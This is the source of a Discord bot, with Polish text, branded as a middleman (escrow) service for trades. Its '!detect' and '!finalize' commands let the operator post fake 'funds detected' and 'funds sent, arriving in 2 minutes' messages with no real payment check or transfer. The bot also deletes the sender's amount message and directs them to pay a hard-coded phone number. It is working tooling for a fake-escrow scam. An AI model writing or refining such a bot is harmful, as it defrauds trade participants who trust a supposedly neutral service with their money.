import {
  Client,
  GatewayIntentBits,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  Events,
} from "discord.js";
import "dotenv/config";

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
  partials: [Partials.Message, Partials.Channel, Partials.Reaction],
});

const sessions = new Map(); // <ticketId> => { senderId, receiverId, amount }

const YELLOW = 0xffd700;
const HEADER = "`　　　　　　💛 DUKAAN MM　　　　　　`";

client.once(Events.ClientReady, () => {
  console.log(`✅ Zalogowano jako ${client.user.tag}`);
});

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  // --- START MM ---
  if (message.content.startsWith("!startmm")) {
    const args = message.content.split(" ");
    const ticketId = args[1];
    const ticket = message.guild.channels.cache.get(ticketId);
    if (!ticket) return message.reply("❌ Nie znaleziono ticketu o tym ID.");

    const embed = new EmbedBuilder()
      .setColor(YELLOW)
      .setDescription(
        `${HEADER}\n\nWybierz swoją rolę poniżej:\n\n` +
          "🔸 **Nadawca** – osoba wysyłająca środki\n" +
          "🔹 **Odbiorca** – osoba otrzymująca środki\n\n" +
          "Po wyborze obie strony klikają **Potwierdź**."
      );

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId("sender")
        .setLabel("Jestem nadawcą")
        .setStyle(ButtonStyle.Secondary),
      new ButtonBuilder()
        .setCustomId("receiver")
        .setLabel("Jestem odbiorcą")
        .setStyle(ButtonStyle.Secondary),
      new ButtonBuilder()
        .setCustomId("confirm")
        .setLabel("Potwierdź")
        .setStyle(ButtonStyle.Success)
    );

    sessions.set(ticketId, {});
    await ticket.send({ embeds: [embed], components: [row] });
    return message.reply("✅ Proces MM rozpoczęty na wybranym tickecie.");
  }

  // --- DETECT ---
  if (message.content.startsWith("!detect")) {
    const args = message.content.split(" ");
    const amount = args.slice(1).join(" ");
    if (!amount) return message.reply("Podaj kwotę, np. `!detect 475zł`.");

    const [ticketId] = sessions.keys();
    if (!ticketId) return message.reply("Nie znaleziono aktywnego ticketa.");

    const ticket = message.guild.channels.cache.get(ticketId);
    const embed = new EmbedBuilder()
      .setColor(YELLOW)
      .setDescription(
        `${HEADER}\n\n💰 **Wykryto przesłane środki:** ${amount}\n\n` +
          "Obie strony muszą potwierdzić poprawność kwoty, a nadawca kliknąć **Wyślij odbiorcy**."
      );

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId("sendToReceiver")
        .setLabel("Wyślij odbiorcy")
        .setStyle(ButtonStyle.Success)
    );

    await ticket.send({ embeds: [embed], components: [row] });
    return message.reply("✅ Wysłano embed z wykryciem środków.");
  }

  // --- FINALIZE ---
  if (message.content.startsWith("!finalize")) {
    const args = message.content.split(" ");
    const phone = args[1];
    if (!phone) return message.reply("Podaj numer, np. `!finalize 600123456`.");

    const [ticketId] = sessions.keys();
    if (!ticketId) return message.reply("Nie znaleziono aktywnego ticketa.");

    const ticket = message.guild.channels.cache.get(ticketId);
    const embed = new EmbedBuilder()
      .setColor(YELLOW)
      .setDescription(
        `${HEADER}\n\n✅ **Środki wysłane na numer:** ${phone}\n💸 **Środki zostaną wysłane do 2 min.**`
      );

    await ticket.send({ embeds: [embed] });
    return message.reply("✅ Wysłano końcowy embed na ticket.");
  }

  // --- Odczytywanie kwoty od nadawcy ---
  for (const [ticketId, data] of sessions.entries()) {
    if (message.channel.id === ticketId && data.senderId === message.author.id) {
      const match = message.content.match(/\d+(?:[.,]\d+)?\s*zł/gi);
      if (match) {
        const amount = match[0];
        data.amount = amount;
        await message.delete().catch(() => {});
        const embed = new EmbedBuilder()
          .setColor(YELLOW)
          .setDescription(
            `${HEADER}\n\n💸 **Wyślij środki na numer telefonu:** 698 962 262\n📦 **Kwota:** ${amount}`
          );
        await message.channel.send({ embeds: [embed] });
      }
    }
  }
});

client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isButton()) return;
  const { customId, channel, user } = interaction;
  const ticketId = channel.id;
  const session = sessions.get(ticketId);
  if (!session) return;

  if (customId === "sender") {
    session.senderId = user.id;
    await interaction.reply({
      content: `🔸 ${user} ustawiono jako **nadawcę**.`,
      ephemeral: true,
    });
  }

  if (customId === "receiver") {
    session.receiverId = user.id;
    await interaction.reply({
      content: `🔹 ${user} ustawiono jako **odbiorcę**.`,
      ephemeral: true,
    });
  }

  if (customId === "confirm") {
    if (!session.senderId || !session.receiverId)
      return interaction.reply({
        content: "⚠️ Obie strony muszą wybrać role przed potwierdzeniem.",
        ephemeral: true,
      });
    await interaction.reply({
      content:
        "✅ Role potwierdzone! Nadawca może teraz wpisać kwotę w formacie np. `475zł`.",
      ephemeral: true,
    });
  }

  if (customId === "sendToReceiver") {
    const embed = new EmbedBuilder()
      .setColor(YELLOW)
      .setDescription(
        `${HEADER}\n\n📱 **Odbiorco**, podaj numer telefonu, na który mają zostać wysłane środki.`
      );
    await channel.send({ content: `<@${session.receiverId}>`, embeds: [embed] });
    await interaction.reply({ content: "✅ Wysłano prośbę o numer.", ephemeral: true });
  }
});

client.login(process.env.TOKEN);
